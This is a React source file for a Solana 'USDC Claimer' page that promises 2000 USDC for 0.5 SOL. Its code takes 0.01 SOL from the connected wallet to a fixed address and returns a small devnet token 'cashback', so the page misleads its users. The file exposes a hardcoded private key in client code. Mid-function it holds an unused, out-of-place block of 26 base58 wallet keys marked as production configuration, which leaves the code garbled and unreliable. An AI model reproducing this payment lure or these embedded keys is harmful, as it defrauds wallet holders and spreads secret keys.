/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2hrLBdYyP5PUrR2HbcoAsxjekxB5RWcyhdrG8fko5TL74JjNPfPwD7r9x2ibfmm1bcmkhKKHMJ1ieDZBTLP1RkQQ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2wdJJ9XNYMsFB2yxEW8piN19Q8aKNx8jjZ5E9gcosny7Z8GJin7F6hsu36jRAuqeZNWSvk1T5abmM2oYD4GeKrtJ",
  "key1": "2RbRSbHDE7xFxb7uQCJomz6hHfYvRdrM1oGoWr3CpqwEF7cKiKvAp7L8FLASJcsQpWxaUX13REf3P1Q64GS2oKoi",
  "key2": "2874VssrVU6724s2GMa3Q4hbekeReBGdcsqDASsPx5s5jZqMfDKC177ccAr7qUs13MB3HyG5peyxzVy1gN32UvyT",
  "key3": "549tFHasbWjm73ACtZXLtryT3me1yqhAnp2xpQSFMVkuoZ5bjc7n9E71hGJJiDNefX7SfMvxUSNVoopgspRuUMuj",
  "key4": "2wufsqKHVkiZW1dQbUgx4RFreJqU9VUJvGU6nQSP76PJQa9jqygvvApRRXyKexuLvQVnFVpVyFWQABdh64kRP7gm",
  "key5": "4ZFtRgAWKMxDoL3DwRtCSNBiaWuNWsDoHrD7TNfoCwQDU9gcT8VfZy7ENxjYjZXxCQRXXqzWshvWdAhBN6Ru6wr8",
  "key6": "4vQ35b9AdkBmR5ChT8uG6v25RPVxYkpPGDbg7V6i6688UDxkHorvA6B1j3NuuWSr29AW8Uyq2RPqtHUufvJxmw45",
  "key7": "4QkFWox3p5JofF3DTqSdipCgSdw8i7kyDZNyMbXRGvU86YARFgRamUhXWgRQEze8rmi5Z5p8JnyhPGyMpw9SZz7r",
  "key8": "5gRDx4Fnv39hXfAnT7zMdwTFbEm5qxELogeQ6ZrNmU3cyuuSuiQ8XhVc7ZxE5hGmCs6FYFnUr8cTu3DYAY7Ts7Aa",
  "key9": "4enhmGmHio9wG9zLytDFHrNddQNB8o3wrbKoZwtL2PJHxS4zU2L535a44c2a9pHhxHY8XFweF5b7zMPBSP18THnq",
  "key10": "BnZ7t9fng4RvQFBwnHmANW4PTYeDErANUV7zPrxd6UGxwPDZL12yrBoC58My3F3gt4gzN5ZSjARqXNHv1EhGGLp",
  "key11": "Xb1Ak451cWPzaX1STo9iu2R9xk6SH8Gpt4gLWrGhTGsXuN2bYDpnof2mn7E6Wk9Fk6qu892eNn7zrj8ZUMPoZPA",
  "key12": "42DCVt3oPvJRzdGvEpW97LSJaMc3TdrSy2hZsRQrZsLgbCSEPTxcVP496CM5H4xRzhmqVL7j3n9tQLWaBqQLSmaT",
  "key13": "2idQmTGmXgdL3Gnz8gryKDT8qSZxJHu1yuGc6aVteRyfW33Q5wC3Bvd443khpYdYXrLuTp2ApJFaJFBGxahTYCpL",
  "key14": "5Qu5xcuhVitt8u7XhRzr3kGrEYN1VjKHBtUcPrDT44fa8epE7zhqhbiersVsVfXqwnPycCzKdz1PS5oiWzBz7k5f",
  "key15": "3wUUqSsCF1HxR6qoCa9QwQ77DHLJ26kYTF5i55DTZiysFfyXnkTAvQ6FBuYVFEpTZojjYK57Bwb4TZv78vKEARP",
  "key16": "4NEnk4gDSpzqf5u87RcLuDwha4dxnZNNsNy4NFx7bt3ttCmX4ropTo3ejg53RPHQYi1b1ZFsCVVyermZdE2AxHxi",
  "key17": "pRQJc6aCdpgRv5GiwhiG98Kur23wd7AVsMJJJavGokf7VwJ42grQAtzBrdixGxTaS2uKSerRgukiUCLZUdwtwGE",
  "key18": "5Ly5xJkxdg5yNJCoL5fF9yo4yGzVk9dPfo9BDoCSqFDExmTZfFXELHDVgcc9kNYfrVcKpTDCsyiL4sZA6ja1NrKp",
  "key19": "3E2tiCcHNem2JcL8T6grzRWxbHjfDjYP4JVzWCGdWSzd3oNjJCr2g7u8X6QTP1KQuKkuNkwvKaB8r5V2BS2vWxAN",
  "key20": "3ZguCxfQWo6uJm8DwoSXphiXiUpkUwSGAmNui6yFo1z4c9hL6qbsHsLe56tBEyKSawfNACoqfoWiabg648WzQKNc",
  "key21": "4QYAagaNx7JYewrz1nAu4msJ3GyMbhfwa9GE4QDxtKnSBJJT9kKJ7cdVAgf64dQNGjoX67Fr6mijnRU1xeLqsk8E",
  "key22": "5RS5RfXQ9A6qbiQKoCQDypZtgXJ4W9qRq82dNrDz2s2hGE6xYHeAXeTvVEAoutjuVcpB4jJaPzCLU825NpZ4gSUw",
  "key23": "N6AxDcwXeirFohNorxkzXSLoMcdF13VNYYaopr7UBQq524teM5rZa7cS8FLsrTvqL717SQWVXKjdfZbdVdP3hXw",
  "key24": "3LjSHA2W2uFaD718fZokErQkLGncCVbiMkH6bWbeotempX625dVGSCNd5KyhmPzErWU8oM8MX9qEAsG3UadFBxS7",
  "key25": "iT5VNJ66fbSLjmPBzr93hA5RmsTNyYzh1cusxthn9eeNvzJ7D8gswY2HdS4hFTHW8EgUuHyBmJGxmZsjdrmzsq3"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
